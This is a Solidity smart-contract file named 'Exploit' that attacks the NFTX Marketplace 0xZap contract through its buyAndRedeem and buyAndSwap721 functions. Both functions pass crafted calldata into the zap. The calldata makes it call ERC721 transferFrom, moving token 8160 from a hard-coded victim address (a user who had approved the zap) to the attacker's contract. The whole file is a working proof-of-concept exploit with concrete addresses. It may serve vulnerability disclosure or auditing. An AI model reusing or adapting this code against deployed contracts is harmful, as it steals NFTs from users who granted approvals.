// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./token/IERC721Upgradeable.sol";
import "./token/IERC20Upgradeable.sol";
import "./NFTXMarketplace0xZap.sol";
import "./token/ERC721SafeHolderUpgradeable.sol";


contract Exploit is ERC721SafeHolderUpgradeable {

    receive() external payable {}
    
    function exploit_buyAndRedeem() public {
         address target = 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e; // target token
         address victim = 0x4ffe2F674C4aFa078554cB2E5a6a672452B6c290; // a random user who approves to nftxzap
         bytes memory data = abi.encodeWithSelector(
             IERC721Upgradeable.transferFrom.selector,
             victim,
             address(this),
             8160 // target token id
         );

         uint256[] memory tokenIds;
         NFTXMarketplace0xZap(payable(0xbbc53022Af15Bb973AD906577c84784c47C14371)).buyAndRedeem{value: 100}(
             399,
             1,
             tokenIds,
             address(this),
             payable(target),
             data,
             payable(address(this))
         );
    }

    function exploit_buyAndSwap() public {
         address target = 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e; // target token
         address victim = 0x4ffe2F674C4aFa078554cB2E5a6a672452B6c290; // a random user who approves to nftxzap
         bytes memory data = abi.encodeWithSelector(
             IERC721Upgradeable.transferFrom.selector,
             victim,
             address(this),
             8160 // target token id
         );

         uint256[] memory idsIn = new uint256[](1);
         idsIn[0] = 3542;
         uint256[] memory specificIds = new uint256[](1);
         specificIds[0] = 9153;
         
         NFTXMarketplace0xZap(payable(0xbbc53022Af15Bb973AD906577c84784c47C14371)).buyAndSwap721{value: 100}(
             34, // vaultId
             idsIn, // idsIn
             specificIds, // specificIds
             address(this),
             payable(target),
             data,
             payable(address(this))
         );
    }
}